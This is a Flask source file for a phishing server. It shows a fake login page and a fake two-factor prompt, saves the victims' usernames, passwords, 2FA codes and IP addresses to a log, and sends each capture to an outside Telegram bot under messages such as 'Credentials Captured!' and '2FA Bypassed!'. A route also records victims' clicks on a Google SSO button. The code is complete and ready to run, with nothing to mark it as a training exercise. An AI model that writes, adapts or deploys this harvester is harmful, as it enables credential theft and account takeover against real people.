from flask import Flask, request, redirect, render_template, session
import datetime
import os
import urllib.request
import json
import random
import time

app = Flask(__name__)
app.secret_key = "404Corp-Secret-Key-2025"

LOG_FILE = "/app/logs/credentials.log"
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

def send_telegram(message):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = json.dumps({
        "chat_id": int(TELEGRAM_CHAT_ID),
        "text": message,
        "parse_mode": "HTML"
    }).encode("utf-8")
    req = urllib.request.Request(url, data=data,
          headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"Telegram error: {e}")

def log_credentials(username, password, ip):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] IP: {ip} | Username: {username} | Password: {password}\n"
    os.makedirs("/app/logs", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)
    print(log_entry)
    message = f"""🎣 <b>Credentials Captured!</b>
🕐 Time: {timestamp}
🌐 IP: {ip}
👤 Username: {username}
🔑 Password: {password}"""
    send_telegram(message)

def log_2fa(code, ip, username):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os.makedirs("/app/logs", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] IP: {ip} | 2FA Code: {code} | User: {username}\n")
    message = f"""🔐 <b>2FA Code Captured!</b>
🕐 Time: {timestamp}
🌐 IP: {ip}
👤 Username: {username}
🔢 2FA Code: {code}
⚡ 2FA Bypassed!"""
    send_telegram(message)

def generate_code():
    seed = int(time.time()) // 30
    random.seed(seed)
    return f"{random.randint(0, 999999):06d}"

@app.route("/")
def index():
    return redirect("/login")

@app.route("/login", methods=["GET"])
def show_login():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def capture_login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    ip = request.remote_addr
    log_credentials(username, password, ip)
    session["username"] = username
    return redirect("/2fa")

@app.route("/sso", methods=["POST"])
def sso():
    ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""🔑 <b>SSO Click Captured!</b>
🕐 Time: {timestamp}
🌐 IP: {ip}
⚡ Victim clicked Google SSO"""
    send_telegram(message)
    session["username"] = "google_user@gmail.com"
    return redirect("/2fa")

@app.route("/2fa", methods=["GET"])
def show_2fa():
    username = session.get("username", "")
    if not username:
        return redirect("/login")
    code = generate_code()
    session["code"] = code
    return render_template("2fa.html", username=username, code=code)

@app.route("/2fa", methods=["POST"])
def capture_2fa():
    code = request.form.get("code", "")
    ip = request.remote_addr
    username = session.get("username", "unknown")
    log_2fa(code, ip, username)
    return redirect("/dashboard")

@app.route("/dashboard")
def show_dashboard():
    username = session.get("username", "")
    if not username:
        return redirect("/login")
    return render_template("dashboard.html", username=username)

@app.route("/health")
def health():
    return {"status": "running"}, 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
